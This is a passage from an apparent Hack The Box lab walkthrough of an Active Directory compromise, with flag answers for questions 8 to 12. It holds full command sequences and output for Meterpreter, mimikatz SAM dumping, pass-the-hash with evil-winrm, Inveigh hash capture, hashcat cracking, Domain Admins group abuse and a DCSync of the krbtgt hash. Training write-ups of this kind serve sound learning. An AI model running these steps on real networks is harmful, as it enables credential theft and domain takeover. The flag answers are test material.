[*] Sending stage (200262 bytes) to 172.16.7.60
[*] Meterpreter session 1 opened (172.16.7.240:1335 -> 172.16.7.60:49718 ) at 2026-08-21 08:48:09 -0400

meterpreter > shell
Process 1516 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\administrator\Desktop\flag.txt
type C:\Users\administrator\Desktop\flag.txt
s3imp3rs0nate_cl@ssic
C:\Windows\system32>
```

**Answer:** `s3imp3rs0nate_cl@ssic`

---

### 8. Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.

Context:
- Dump the credentials:
```bash
C:\Windows\system32>exit
exit
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : SQL01
SysKey : 2cdbbee2d1fb9cfb7cf7189fa66971a6
Local SID : S-1-5-21-3827174835-953655006-33323432

SAMKey : 1f3713f605ea38af43344dc944dea5ce

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 880170df783dda58497007c8de7a836f

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-GVQQMKJCNDAAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a6b660de661c6a558a414560082262069223fb9815fab1f08169e0bb3954bc10
      aes128_hmac       (4096) : da03dd69f9d316baf21d16bb0639a559
      des_cbc_md5       (4096) : ef9898bf10c754b5
    OldCredentials
      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
      des_cbc_md5       (4096) : 9876615285c2766e
    OlderCredentials
      aes256_hmac       (4096) : 09c55a10e6b955caac4abbf7ff37b81488a2ede67a150c00c775fa00d94768ab
      aes128_hmac       (4096) : b49643128581ac08a1fae957f7787f72
      des_cbc_md5       (4096) : d32592d63b75ec1f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-GVQQMKJCNDAAdministrator
    Credentials
      des_cbc_md5       : ef9898bf10c754b5
    OldCredentials
      des_cbc_md5       : 9876615285c2766e


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
      des_cbc_md5       (4096) : 61299e7a768fa2d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 61299e7a768fa2d5
```
- Get the flag with the NLTM hash:
```bash
┌─[htb-student@skills-par01]─[~]
└──╼ $evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt
exc3ss1ve_adm1n_r1ights!
```

**Answer:** `exc3ss1ve_adm1n_r1ights!`

---

### 9. Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?

Context:
- Use Inveigh:
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/21/2026   8:13 AM         303194 Inveigh.ps1
-a----        8/21/2026   7:56 AM         770279 PowerView.ps1


*Evil-WinRM* PS C:\Users\Administrator\Documents> Import-Module .\Inveigh.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Inveigh -NBNS Y LLMNR Y -ConsoleOutput Y -FileOutput Y
```
- Get the NLTM hash for `CT059`:
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Inveigh
[+] [2026-08-21T08:15:35] TCP(5985) SYN packet detected from 172.16.7.240:44920
[+] [2026-08-21T08:15:35] TCP(5985) SYN packet detected from 172.16.7.240:44924
[+] [2026-08-21T08:15:54] TCP(445) SYN packet detected from 172.16.7.3:49435
[+] [2026-08-21T08:15:54] SMB(445) negotiation request detected from 172.16.7.3:49435
[+] [2026-08-21T08:15:54] Domain mapping added for INLANEFREIGHT to INLANEFREIGHT.LOCAL
[+] [2026-08-21T08:15:54] SMB(445) NTLM challenge B5AE8309EE5D29E5 sent to 172.16.7.3:49435
[+] [2026-08-21T08:15:54] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):49435:
CT059::INLANEFREIGHT:B5AE8309EE5D29E5:BFEF1F79FB762BDB97A92713A8A41E77:0101000000000000718356326F31DD016E503590B87057EB0000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800718356326F31DD01060004000200000008003000300000000000000000000000002000001ACA491396131D2DB52AE03BB6506A52E8C32DB35E7159AF17385D83D45883CF0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
<SNIP>
```

**Answer:** `CT059`

---

### 10. Crack this user's password hash and submit the cleartext password as your answer.

Context:
- Crack the hash:
```
┌─[eu-academy-2]─[10.10.15.191]─[htb-ac-2162140@htb-sy4qc5w9gb-htb-cloud-com]─[~]
└──╼ [★]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC-Milan Processor, 3844/7752 MB (969 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC-Milan Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213744 bytes (95.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

CT059::INLANEFREIGHT:b5ae8309ee5d29e5:bfef1f79fb762bdb97a92713a8a41e77:0101000000000000718356326f31dd016e503590b87057eb0000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0007000800718356326f31dd01060004000200000008003000300000000000000000000000002000001aca491396131d2db52ae03bb6506a52e8c32db35e7159af17385d83d45883cf0a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0037002e0035003000000000000000000000000000:charlie1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: CT059::INLANEFREIGHT:b5ae8309ee5d29e5:bfef1f79fb762...000000
Time.Started.....: Fri Aug 21 09:19:37 2026 (0 secs)
Time.Estimated...: Fri Aug 21 09:19:37 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1504.1 kH/s (1.13ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1

Started: Fri Aug 21 09:19:29 2026
Stopped: Fri Aug 21 09:19:38 2026
```

**Answer:** `charlie1`

---

### 11. Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.

Context:
- To get access to DC01, we have to perform DCSync:
```bash
┌─[eu-academy-2]─[10.10.15.191]─[htb-ac-2162140@htb-sy4qc5w9gb-htb-cloud-com]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1 /d:inlanefreight.local /dynamic-resolution /drive:Shared,//home/htb-ac-2162140/
```
```powershell
PS C:\Users\CT059> hostname
MS01
PS C:\Users\CT059> Net group "Domain Admins" ct059 /add /domain
The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

The command completed successfully.

PS C:\Users\CT059> $pass1 = ConvertTo-SecureString  'charlie1' -AsPlainText -Force
PS C:\Users\CT059> $cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\CT059', $pass1)
PS C:\Users\CT059> Enter-PSSession -ComputerName DC01 -Credential $cred
[DC01]: PS C:\Users\CT059\Documents> hostname
DC01
[DC01]: PS C:\Users\CT059\Documents> whoami
inlanefreight\ct059
[DC01]: PS C:\Users\CT059\Documents> type C:\Users\Administrator\Desktop\flag.txt
acLs_f0r_th3_w1n!
[DC01]: PS C:\Users\CT059\Documents>
```

**Answer:** `acLs_f0r_th3_w1n!`

---

### 12. Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.

Context:
- Use `mimikatz.exe`:
```bash
[DC01]: PS C:\Users\CT059\Documents> .\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 4/1/2022 7:44:51 AM
Object Security ID   : S-1-5-21-3327542485-274640656-2609762496-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 7eba70412d81c1cd030d72a3e8dbe05f
    ntlm- 0: 7eba70412d81c1cd030d72a3e8dbe05f
    lm  - 0: 71952be36b6b9624ea743f9924576514

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6b17b95d9a625b4becbb24744db3f112

* Primary:Kerberos-Newer-Keys *
    Default Salt : INLANEFREIGHT.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b043a263ca018cee4abe757dea38e2cee7a42cc56ccb467c0639663202ddba91
      aes128_hmac       (4096) : e1fe1e9e782036060fb7cbac23c87f9d
      des_cbc_md5       (4096) : e0a7fbc176c28a37

* Primary:Kerberos *
    Default Salt : INLANEFREIGHT.LOCALkrbtgt
    Credentials
      des_cbc_md5       : e0a7fbc176c28a37

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  e4c9dbdc53a5c97068830d3687c7bd7c
    02  702f9704d7aaf7fee4d6020af268fa03
    03  8735d0e2dce9b52ce281a8124366a7ab
    04  e4c9dbdc53a5c97068830d3687c7bd7c
    05  702f9704d7aaf7fee4d6020af268fa03
    06  21c30e7bcddbc464538ce0f20329d076
    07  e4c9dbdc53a5c97068830d3687c7bd7c
    08  65036b1bf85a1b3c59ab55b971f1c8b3
    09  4e21ed7b2e12571d785298c2741fdc5a
    10  23225d803400647f976434dd42380da6
    11  65036b1bf85a1b3c59ab55b971f1c8b3
    12  4e21ed7b2e12571d785298c2741fdc5a
    13  38c34b1c773d59f056c88a5a25c438ea
    14  65036b1bf85a1b3c59ab55b971f1c8b3
    15  dff1b3a336808c31e2c967ff6cde69b4
    16  ff19c32433737df30917614eac40cab3
    <SNIP>
```

**Answer:** `7eba70412d81c1cd030d72a3e8dbe05f`

---


[Back to Module Index](./README.md)
